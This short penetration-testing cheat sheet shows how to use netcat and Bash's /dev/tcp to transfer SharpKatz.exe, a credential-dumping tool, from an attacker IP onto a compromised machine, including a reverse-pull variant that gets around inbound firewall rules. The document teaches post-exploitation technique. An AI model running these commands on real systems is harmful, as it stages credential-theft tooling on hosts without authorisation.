# NetCat  Transfer

## Download to Target

**Start NetCat on the compromised machine:** Start NetCat (**nc**) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the **stdout** using a single greater-than `>` followed by the filename, `SharpKatz.exe`.

```shell
victim@target[~]$ nc -l -p 8000 > SharpKatz.exe
```

**Send the file to the compromised machine:**

```shell
clue@machine[/]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

## Upload to Target

This method is useful in scenarios where there's a **firewall blocking inbound connections**.

**Start the NetCat listener locally:**

```shell
clue@machine[/]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

**Connect the target to the attacker machine and receive the file:**

```shell
victim@target[~]$ nc 192.168.49.128 443 > SharpKatz.exe
```

## Connect to NetCat via Bash

If **Netcat** or **Ncat** is not available on the compromised machine, **Bash** supports read/write operations on a pseudo-device file `/dev/TCP/`.

Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.

```shell
victim@target[~]$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
